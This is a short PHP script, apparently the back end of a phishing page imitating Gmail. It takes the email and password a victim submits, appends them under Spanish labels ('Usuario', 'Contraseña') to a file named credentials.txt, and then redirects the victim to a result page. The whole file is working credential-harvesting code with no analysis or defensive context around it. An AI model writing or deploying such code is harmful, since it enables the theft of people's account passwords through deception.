<?php

file_put_contents("credentials.txt", "[+] Gmail -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();
?>
